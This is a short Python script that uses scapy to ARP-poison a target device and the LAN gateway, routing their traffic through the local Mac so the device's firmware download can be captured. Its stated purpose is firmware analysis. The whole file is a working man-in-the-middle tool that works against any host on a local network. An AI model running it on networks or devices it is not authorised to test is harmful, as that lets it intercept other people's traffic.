#!/usr/bin/env python3
"""Redirect one LAN host's traffic through this Mac so we can capture its OTA download.

Poisons the target's ARP cache (we become its gateway) AND the gateway's ARP cache
(we become the target), so both directions flow through us. Requires IP forwarding on
and root. Restores both caches cleanly on Ctrl-C.
"""
import argparse
import sys
import time

from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp


def mac_of(ip):
    m = getmacbyip(ip)
    if not m:
        sys.exit(f"Could not resolve MAC for {ip} — is it awake on the LAN?")
    return m


def poison(iface, src_mac, target_ip, target_mac, spoof_ip):
    # Tell target_ip that spoof_ip is at our MAC.
    sendp(Ether(dst=target_mac, src=src_mac) /
          ARP(op=2, psrc=spoof_ip, hwsrc=src_mac, pdst=target_ip, hwdst=target_mac),
          iface=iface, verbose=0)


def restore(iface, target_ip, target_mac, spoof_ip, spoof_mac):
    # Broadcast the real mapping a few times so caches heal fast.
    for _ in range(5):
        sendp(Ether(dst=target_mac, src=spoof_mac) /
              ARP(op=2, psrc=spoof_ip, hwsrc=spoof_mac, pdst=target_ip, hwdst=target_mac),
              iface=iface, verbose=0)


def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--target", required=True, help="device to redirect, e.g. the Pixoo IP")
    p.add_argument("--gateway", required=True, help="router/gateway IP")
    p.add_argument("--iface", default=conf.iface)
    args = p.parse_args()

    me = get_if_hwaddr(args.iface)
    tmac = mac_of(args.target)
    gmac = mac_of(args.gateway)
    print(f"iface {args.iface} ({me})\n target {args.target} ({tmac})\n gateway {args.gateway} ({gmac})")
    print("Poisoning every 2s. Click 'Update firmware' in the app now. Ctrl-C to stop + restore.")
    try:
        while True:
            poison(args.iface, me, args.target, tmac, args.gateway)
            poison(args.iface, me, args.gateway, gmac, args.target)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring ARP caches...")
        restore(args.iface, args.target, tmac, args.gateway, gmac)
        restore(args.iface, args.gateway, gmac, args.target, tmac)
        print("done.")


if __name__ == "__main__":
    main()
